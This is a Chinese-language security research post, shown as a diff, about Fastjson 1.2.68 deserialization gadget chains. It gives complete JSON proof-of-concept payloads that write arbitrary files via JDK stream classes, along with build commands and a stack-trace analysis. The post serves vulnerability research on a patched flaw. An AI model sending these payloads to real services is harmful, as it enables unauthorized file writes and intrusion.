@@ -1,0 +1,211 @@
+﻿标题: 寻找Fastjson 1.2.68 AutoCloseable利用链(3)
+
+创建: 2020-08-11 17:15
+更新: 2021-05-28 10:06
+链接: https://scz.617.cn/web/202008111715.txt
+
+--------------------------------------------------------------------------
+
+目录:
+
+    ☆ 前言
+    ☆ RMB122的PoC(只用自带库)
+        1) AutoCloseable_writefile_rmb122.json(适用于JDK 11)
+        3) MarshalOutputStream是ObjectOutputStream的子孙类
+        4) InflaterOutputStream负责写数据
+        5) AutoCloseable_writefile_rmb122_8.json(适用于JDK 8/10)
+    ☆ 仅需依赖Commons IO 2.x写文件
+
+--------------------------------------------------------------------------
+
+☆ 前言
+
+文中涉及到的相关漏洞均为官方已经公开并修复的漏洞，涉及到的安全技术也仅用于
+企业安全建设和安全对抗研究。本文仅限业内技术研究与讨论，严禁用于非法用途，
+否则产生的一切后果自行承担。
+
+参看:
+
+《寻找Fastjson 1.2.68 AutoCloseable利用链》
+https://scz.617.cn/web/202008081723.txt
+
+《寻找Fastjson 1.2.68 AutoCloseable利用链(2)》
+https://scz.617.cn/web/202008100900.txt
+
+2020年8月10日，ID为"存在感为零的小透明/RMB122"的网友分享了一个更神奇的PoC:
+
+https://pastebin.com/ZwLxJZ2E
+
+这个PoC很强大，只用自带库向指定文件写任意数据。他的PoC适用于JDK 11，我简单
+改了一下，顺道提供适用于JDK 8/10的PoC，这两种PoC没法统一，原因见后文。
+
+感慨一下。我在上周六分享了一个极小众PoC，不是我不想分享NB的PoC，实在是水平
+有限，能弄出一个接近现实世界的就算祖上烧高香了。然后就开始时来运转，本周一
+意外看到浅蓝的原始PoC，学习之后我又分享了(2)。然后RMB122在我微博下面给出本
+文介绍的这个强大的PoC，学习之后我接着分享(3)，也为世界添砖加瓦，大家互利互
+惠么。这就是传说中老中医的连环炸，特别适用于不混圈子的散仙，各位渡劫的道友
+有请了。
+
+☆ RMB122的PoC(只用自带库)
+
+1) AutoCloseable_writefile_rmb122.json(适用于JDK 11)
+
+$ echo -ne "RMB122 is here" | openssl zlib | base64 -w 0
+eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==
+
+$ echo -ne "RMB122 is here" | openssl zlib | wc -c
+22
+
+关于此处所用压缩算法，参看:
+
+《Java中的Deflate/Inflate》
+https://scz.617.cn/web/202008111505.txt
+
+--------------------------------------------------------------------------
+{
+    '@type':"java.lang.AutoCloseable",
+    '@type':'sun.rmi.server.MarshalOutputStream',
+    'out':
+    {
+        '@type':'java.util.zip.InflaterOutputStream',
+        'out':
+        {
+           '@type':'java.io.FileOutputStream',
+           'file':'dst',
+           'append':false
+        },
+        'infl':
+        {
+            'input':
+            {
+                'array':'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==',
+                'limit':22
+            }
+        },
+        'bufLen':1048576
+    },
+    'protocolVersion':1
+}
+--------------------------------------------------------------------------
+
+该PoC只在JDK 11中测试成功，不依赖第三方库。
+
+X:\Java\jdk-11.0.5\bin\java -cp "fastjson-1.2.68.jar;." FastjsonDeserialize2 AutoCloseable_writefile_rmb122.json
+
+$ xxd -g 1 dst
+00000000: 52 4d 42 31 32 32 20 69 73 20 68 65 72 65        RMB122 is here
+
+3) MarshalOutputStream是ObjectOutputStream的子孙类
+
+PoC中的MarshalOutputStream只负责flush()，地位与浅蓝选用的SerialOutput相当。
+
+4) InflaterOutputStream负责写数据
+
+--------------------------------------------------------------------------
+FileOutputStream.write(byte[], int, int) line: 354
+InflaterOutputStream.write(byte[], int, int) line: 255
+ObjectOutputStream$BlockDataOutputStream.drain() line: 1883
+ObjectOutputStream$BlockDataOutputStream.setBlockDataMode(boolean) line: 1792
+MarshalOutputStream(ObjectOutputStream).<init>(OutputStream) line: 248
+MarshalOutputStream.<init>(OutputStream, int) line: 64
+NativeConstructorAccessorImpl.newInstance0(Constructor<?>, Object[]) line: not available [native method]
+NativeConstructorAccessorImpl.newInstance(Object[]) line: 62
+DelegatingConstructorAccessorImpl.newInstance(Object[]) line: 45
+Constructor<T>.newInstance(Object...) line: 490
+JavaBeanDeserializer.deserialze(DefaultJSONParser, Type, Object, Object, int, int[]) line: 1012
+JavaBeanDeserializer.deserialze(DefaultJSONParser, Type, Object, int) line: 288
+JavaBeanDeserializer.deserialze(DefaultJSONParser, Type, Object) line: 284
+JavaBeanDeserializer.deserialze(DefaultJSONParser, Type, Object, Object, int, int[]) line: 808
+JavaBeanDeserializer.deserialze(DefaultJSONParser, Type, Object, int) line: 288
+JavaBeanDeserializer.deserialze(DefaultJSONParser, Type, Object) line: 284
+DefaultJSONParser.parseObject(Map, Object) line: 395
+DefaultJSONParser.parse(Object) line: 1401
+DefaultJSONParser.parse() line: 1367
+JSON.parse(String, ParserConfig, int) line: 183
+JSON.parse(String, int) line: 193
+JSON.parse(String) line: 149
+JSON.parseObject(String) line: 254
+FastjsonDeserialize2.main(String[]) line: 23
+--------------------------------------------------------------------------
+
+参看:
+
+https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/zip/InflaterOutputStream.html
+https://hg.openjdk.java.net/jdk-updates/jdk11u-dev/file/jdk-11.0.5+10/src/java.base/share/classes/java/util/zip/InflaterOutputStream.java
+
+--------------------------------------------------------------------------
+/*
+ * java.util.zip.InflaterOutputStream.write(byte[], int, int) : void
+ */
+public void write(byte[] b, int off, int len) throws IOException {
+...
+    // Write uncompressed data to the output stream
+    try {
+        for (;;) {
+            int n;
+...
+            // Decompress and write blocks of output data
+            do {
+/*
+ * 253行，解压
+ */
+                n = inf.inflate(buf, 0, buf.length);
+                if (n > 0) {
+/*
+ * 255行，写解压后的数据
+ */
+                    out.write(buf, 0, n);
+                }
+            } while (n > 0);
+...
+}
+--------------------------------------------------------------------------
+
+5) AutoCloseable_writefile_rmb122_8.json(适用于JDK 8/10)
+
+以8u232为例，"java.util.zip.Inflater"没有名为input的成员，只有成员
+"byte[] buf"，其对应的setter是:
+
+java.util.zip.Inflater.setInput(byte[]) : void
+
+据此修改PoC。
+
+--------------------------------------------------------------------------
+{
+    '@type':"java.lang.AutoCloseable",
+    '@type':'sun.rmi.server.MarshalOutputStream',
+    'out':
+    {
+        '@type':'java.util.zip.InflaterOutputStream',
+        'out':
+        {
+           '@type':'java.io.FileOutputStream',
+           'file':'dst',
+           'append':false
+        },
+        'infl':
+        {
+            'input':'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw=='
+        },
+        'bufLen':1048576
+    },
+    'protocolVersion':1
+}
+--------------------------------------------------------------------------
+
+java \
+-cp "fastjson-1.2.68.jar:." \
+FastjsonDeserialize2 AutoCloseable_writefile_rmb122_8.json
+
+MarshalOutputStream、InflaterOutputStream、FileOutputStream用的都是有参构
+造函数，全部面临ASMUtils.lookupParameterNames()的检查。
+
+目标环境中的jar包或modules文件是否保留调试信息，只能case by case检查了。我
+的RedHat 7.6中的8u232、Debian 9中的10.0.2、Windows中的11.0.5都带调试信息，
+但Windows中的8u221就不带；或许Linux中的大部分都带，而Windows中11以前的都不
+带？这种猜测没啥意义，也就顺嘴一胡猜。
+
+☆ 仅需依赖Commons IO 2.x写文件
+
+Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析 - voidfyoo [2021-05-27]
+https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg
